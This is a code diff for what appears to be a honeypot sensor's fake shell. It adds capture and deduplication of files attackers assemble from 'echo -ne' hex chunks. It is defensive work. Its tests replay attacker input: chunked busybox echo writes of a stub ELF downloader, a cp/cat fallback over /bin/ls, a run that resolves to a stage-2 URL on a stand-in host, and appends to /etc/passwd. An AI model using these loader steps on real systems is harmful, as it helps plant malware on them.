@@ -20,6 +20,11 @@
 //! included. Identical bodies (by SHA-256 of the bytes kept) are one capture whose `repeat_count`
 //! says how many times the session sent it: a bot that retries an upload yields one sample, not
 //! one per attempt.
+//!
+//! The same set takes the files the shell assembled from bytes the attacker typed (an echo
+//! loader's `echo -ne '\xNN...' >> .i` chunks): at once when the file is made executable or run,
+//! and, for one never run, when the session ends. A body is one sample per session whichever
+//! path saw it first.
 #![deny(
     clippy::arithmetic_side_effects,
     clippy::unwrap_used,
@@ -35,6 +40,7 @@ use sensor_wire::{
 use sha2::{Digest, Sha256};
 
 use crate::capture_budget::CaptureBody;
+use crate::fakefs::{FakeFs, READ_CAP};
 use crate::handoff::{CaptureEnd, CaptureHandoff, CaptureJob, UploadEnd, upload_metadata};
 use crate::sanitize::sanitize_value;
 use crate::shell::{CommandResult, FakeShell, InputEnd};
@@ -45,6 +51,17 @@ pub const CAPTURE_REASON_EXEC_STDIN: &str = "exec_stdin";
 /// `capture_reason` of input typed (or pasted) at an interactive shell's terminal and consumed by
 /// a command there.
 pub const CAPTURE_REASON_SHELL_STDIN: &str = "shell_stdin";
+
+/// `capture_reason` of a file the shell assembled from bytes the attacker typed as `echo` or
+/// `printf` escapes, redirected into it chunk by chunk (see `FakeShell::with_captures`).
+pub const CAPTURE_REASON_ECHO_LOADER: &str = "echo_loader";
+
+/// Files one session tracks for the capture at its end. A loader drops one file, or a few.
+const MAX_TRACKED_FILES: usize = 16;
+
+/// A file assembled in fewer chunks than this, and never made executable or run, is not captured
+/// when the session ends: one `echo x > f` is a write probe or a note, not an upload.
+const MIN_UNRUN_CHUNKS: u32 = 2;
 
 /// Distinct bodies one session holds for deduplication. A further distinct body is submitted at
 /// once, on its own, so the bound costs deduplication and never a capture.
@@ -300,6 +317,7 @@ impl HeldInput {
             reason: self.reason,
             command: std::mem::take(&mut self.command),
             destination: destination.map(|path| sanitize_value(&path, MAX_DESTINATION_LEN)),
+            chunk_count: None,
         });
     }
 }
@@ -341,6 +359,31 @@ struct Consumed {
     reason: &'static str,
     command: String,
     destination: Option<String>,
+    /// For an assembled file: how many writes built it.
+    chunk_count: Option<u32>,
+}
+
+/// A file the shell assembled from bytes the attacker typed, handed over when it was made
+/// executable or run (see [`StdinCaptures::record_assembled`]).
+#[derive(Clone, Debug)]
+pub(crate) struct AssembledFile {
+    /// The file's path as the shell resolved it.
+    pub path: String,
+    pub bytes: Vec<u8>,
+    pub chunk_count: u32,
+    /// The line that wrote the last chunk, sanitized and capped like `metadata.command`.
+    pub command: String,
+}
+
+/// A file assembled this session, as the session's end finds it: captured then unless it was
+/// already, it was changed by something else since, or it is too small an assembly to be one.
+#[derive(Clone, Debug)]
+pub(crate) struct TrackedFile {
+    pub path: String,
+    /// The content the last chunk left, so a file overwritten since is not taken for it.
+    pub sha256: [u8; 32],
+    pub chunk_count: u32,
+    pub command: String,
 }
 
 /// One distinct body and how many times the session sent it.
@@ -361,6 +404,15 @@ struct CaptureSet {
     handoff: Arc<CaptureHandoff>,
     source: CaptureSource,
     held: Vec<Capture>,
+    /// Digests of every body recorded or submitted this session, so an assembled file is taken
+    /// once however many times it is run or found.
+    seen: Vec<[u8; 32]>,
+    /// The session's filesystem and the files assembled in it, read when the session ends.
+    files: Option<FakeFs>,
+    tracked: Vec<TrackedFile>,
+    /// How the session ended, as its sensor reported it; a session cancelled at `max_duration`
+    /// reports nothing.
+    session_end: CaptureEnd,
 }
 
 impl StdinCaptures {
@@ -370,7 +422,53 @@ impl StdinCaptures {
                 handoff,
                 source,
                 held: Vec::new(),
+                seen: Vec::new(),
+                files: None,
+                tracked: Vec::new(),
+                session_end: CaptureEnd::Cancelled,
             })),
+        }
+    }
+
+    /// Record how the session ended, for the files captured when it does. Sensors call this at
+    /// their exit paths; a session the listener cancels never does, and stays `Cancelled`.
+    pub fn end_session(&self, end: CaptureEnd) {
+        self.lock().session_end = end;
+    }
+
+    /// Take an assembled file that was made executable or run. The assembly is finished as far as
+    /// the attacker is concerned, so it is recorded as a complete transfer. A body already
+    /// recorded this session, by this path or another, is not taken again.
+    pub(crate) fn record_assembled(&self, file: AssembledFile) {
+        let AssembledFile {
+            path,
+            bytes,
+            chunk_count,
+            command,
+        } = file;
+        let mut set = self.lock();
+        set.take_file(
+            &path,
+            &bytes,
+            chunk_count,
+            command,
+            UploadEnd::TransferComplete,
+        );
+    }
+
+    /// The files assembled so far and the filesystem holding them, replacing what an earlier
+    /// line reported. Read once, when the session ends.
+    pub(crate) fn track_assembled(&self, fs: &FakeFs, files: Vec<TrackedFile>) {
+        let mut set = self.lock();
+        if set.files.is_none() {
+            set.files = Some(fs.share());
+        }
+        for file in files {
+            if let Some(known) = set.tracked.iter_mut().find(|t| t.path == file.path) {
+                *known = file;
+            } else if set.tracked.len() < MAX_TRACKED_FILES {
+                set.tracked.push(file);
+            }
         }
     }
 
@@ -408,6 +506,11 @@ impl StdinCaptures {
             }
             return;
         }
+        // The same bytes already went out as an assembled file: one sample, not two.
+        if set.seen.contains(&sha256) {
+            return;
+        }
+        set.seen.push(sha256);
         let capture = Capture {
             sha256,
             consumed,
@@ -422,6 +525,65 @@ impl StdinCaptures {
 }
 
 impl CaptureSet {
+    /// Submit the assembled file `bytes` at `path` unless this session already recorded the same
+    /// bytes. It goes at once rather than being held: a loader's file is final when it runs it,
+    /// and the console should see the sample while the session is still going.
+    fn take_file(
+        &mut self,
+        path: &str,
+        bytes: &[u8],
+        chunk_count: u32,
+        command: String,
+        end: UploadEnd,
+    ) {
+        if bytes.is_empty() {
+            return;
+        }
+        let sha256: [u8; 32] = Sha256::digest(bytes).into();
+        if self.seen.contains(&sha256) {
+            return;
+        }
+        self.seen.push(sha256);
+        let mut body = self.handoff.new_capture_body();
+        // A refusal by the memory budget keeps the prefix that fit and marks the body exhausted,
+        // which the hand-off reports; `wire_size` still says how large the file was.
+        let _ = body.extend_from_slice(bytes);
+        self.submit(Capture {
+            sha256,
+            consumed: Consumed {
+                body,
+                wire_size: u64::try_from(bytes.len()).unwrap_or(u64::MAX),
+                end,
+                reason: CAPTURE_REASON_ECHO_LOADER,
+                command,
+                destination: Some(sanitize_value(path, MAX_DESTINATION_LEN)),
+                chunk_count: Some(chunk_count),
+            },
+            repeats: 1,
+        });
+    }
+
+    /// The tracked files as the session leaves them, taken unless already recorded, changed
+    /// since their last chunk, or assembled in too few chunks to be an upload.
+    fn take_tracked_files(&mut self) {
+        let Some(fs) = self.files.take() else {
+            return;
+        };
+        let end = UploadEnd::Session(self.session_end);
+        for file in std::mem::take(&mut self.tracked) {
+            if file.chunk_count < MIN_UNRUN_CHUNKS {
+                continue;
+            }
+            let Ok(bytes) = fs.read_all(&file.path, READ_CAP) else {
+                continue;
+            };
+            let sha256: [u8; 32] = Sha256::digest(&bytes).into();
+            if sha256 == file.sha256 {
+                self.take_file(&file.path, &bytes, file.chunk_count, file.command, end);
+            }
+        }
+    }
+
     fn submit(&self, capture: Capture) {
         let Capture {
             consumed, repeats, ..
@@ -433,6 +595,7 @@ impl CaptureSet {
             reason,
             command,
             destination,
+            chunk_count,
         } = consumed;
         let source = self.source.clone();
         let orig_name = destination
@@ -450,6 +613,9 @@ impl CaptureSet {
                     object.insert("command".into(), serde_json::json!(command));
                     object.insert("destination".into(), serde_json::json!(destination));
                     object.insert("repeat_count".into(), serde_json::json!(repeats));
+                    if let Some(chunks) = chunk_count {
+                        object.insert("chunk_count".into(), serde_json::json!(chunks));
+                    }
                 }
                 SensorEvent {
                     v: WIRE_VERSION,
@@ -474,6 +640,7 @@ impl CaptureSet {
 /// handle goes when the session's future is dropped, cancelled or not. `submit` never blocks.
 impl Drop for CaptureSet {
     fn drop(&mut self) {
+        self.take_tracked_files();
         for capture in std::mem::take(&mut self.held) {
             self.submit(capture);
         }
@@ -677,5 +844,112 @@ mod tests {
             events[0]["metadata"]["destination"],
             serde_json::Value::Null
         );
+    }
+
+    /// A downloader as an echo loader sends it: ELF magic, bytes past 0x7f, a request line.
+    const DOWNLOADER: &[u8] = b"\x7fELF\x02\x01\x01\0\xff\x80\x0a\0GET /s2.bin HTTP/1.1\r\n\0";
+
+    fn loader_shell(captures: &StdinCaptures) -> FakeShell {
+        let mut shell = FakeShell::new(FakeFs::new(), ctx()).with_captures(captures.clone());
+        shell.handle_input("cd /tmp");
+        shell
+    }
+
+    /// Upload `body` to `path` in 8-byte `echo -ne` chunks; returns how many.
+    fn upload_chunks(shell: &mut FakeShell, path: &str, body: &[u8]) -> usize {
+        for (index, chunk) in body.chunks(8).enumerate() {
+            let op = if index == 0 { ">" } else { ">>" };
+            let text: String = chunk.iter().map(|b| format!("\\x{b:02x}")).collect();
+            shell.handle_input(format!("/bin/busybox echo -ne '{text}' {op} {path}"));
+        }
+        body.chunks(8).count()
+    }
+
+    /// Where `chmod` fails, the loader copies its bytes into a copy of `/bin/ls` and back. The
+    /// file it then runs is still its assembly, found by content: captured once, as the chunks
+    /// built it, with the stage-2 URL derived from the run's arguments.
+    #[tokio::test]
+    async fn the_loaders_copy_fallback_still_finds_its_assembly_and_derives_the_url() {
+        let dir = tempfile::tempdir().unwrap();
+        let handoff = handoff(dir.path());
+        let captures = StdinCaptures::new(handoff.clone(), source());
+        let mut shell = loader_shell(&captures);
+        let chunks = upload_chunks(&mut shell, ".i", DOWNLOADER);
+        shell.handle_input("cp /bin/ls .j && cat .i>.j &&rm .i && cp .j .i &&rm .j");
+        let (out, line_events) = shell.handle_input("./.i 203 0 113 9 8080");
+        assert!(out.is_empty(), "{out}");
+        assert_eq!(out.status, 1);
+        let urls: Vec<&serde_json::Value> = line_events
+            .iter()
+            .filter(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD)
+            .map(|e| &e.metadata)
+            .collect();
+        assert_eq!(urls.len(), 1, "{line_events:?}");
+        assert_eq!(urls[0]["url"], "http://203.0.113.9:8080/s2.bin");
+        assert_eq!(urls[0]["derived_from"], "echo_loader_args");
+        // Running it again is the same sample, not a second one.
+        shell.handle_input("./.i 203 0 113 9 8080");
+        drop(shell);
+        drop(captures);
+        handoff.drain(std::time::Duration::from_secs(5)).await;
+        let events = events(dir.path());
+        assert_eq!(events.len(), 1, "{events:?}");
+        let meta = &events[0]["metadata"];
+        assert_eq!(meta["capture_reason"], "echo_loader");
+        assert_eq!(meta["chunk_count"], chunks);
+        assert_eq!(meta["destination"], "/tmp/.i");
+        assert_eq!(meta["size"], DOWNLOADER.len());
+        assert_eq!(meta["end_reason"], "transfer_complete");
+        assert_eq!(
+            meta["sha256"],
+            Sha256::digest(DOWNLOADER)
+                .iter()
+                .map(|b| format!("{b:02x}"))
+                .collect::<String>()
+        );
+    }
+
+    /// An assembly the session never ran is taken as the session leaves it; a single `echo > f`
+    /// and chunks appended to a file the attacker did not start are not assemblies.
+    #[tokio::test]
+    async fn an_assembly_never_run_is_captured_at_the_session_end_and_nothing_else_is() {
+        let dir = tempfile::tempdir().unwrap();
+        let handoff = handoff(dir.path());
+        let captures = StdinCaptures::new(handoff.clone(), source());
+        let mut shell = loader_shell(&captures);
+        let chunks = upload_chunks(&mut shell, "part", DOWNLOADER);
+        shell.handle_input("echo probe > /tmp/w");
+        shell.handle_input("echo one >> /etc/passwd");
+        shell.handle_input("echo two >> /etc/passwd");
+        captures.end_session(CaptureEnd::PeerClosed);
+        drop(shell);
+        drop(captures);
+        handoff.drain(std::time::Duration::from_secs(5)).await;
+        let events = events(dir.path());
+        assert_eq!(events.len(), 1, "{events:?}");
+        let meta = &events[0]["metadata"];
+        assert_eq!(meta["destination"], "/tmp/part");
+        assert_eq!(meta["chunk_count"], chunks);
+        assert_eq!(meta["end_reason"], "peer_closed");
+        assert_eq!(meta["complete"], true);
+    }
+
+    /// A file overwritten after its last chunk holds something else: neither running it nor the
+    /// session's end takes it for the assembly.
+    #[tokio::test]
+    async fn a_file_overwritten_after_its_last_chunk_is_not_the_assembly() {
+        let dir = tempfile::tempdir().unwrap();
+        let handoff = handoff(dir.path());
+        let captures = StdinCaptures::new(handoff.clone(), source());
+        let mut shell = loader_shell(&captures);
+        upload_chunks(&mut shell, ".i", DOWNLOADER);
+        shell.handle_input("cp /bin/ls .i");
+        let (out, line_events) = shell.handle_input("chmod +x .i; ./.i 203 0 113 9 80");
+        assert_eq!(out.status, 0);
+        assert_eq!(line_events.len(), 1, "no derived URL: {line_events:?}");
+        drop(shell);
+        drop(captures);
+        handoff.drain(std::time::Duration::from_secs(5)).await;
+        assert!(events(dir.path()).is_empty());
     }
 }
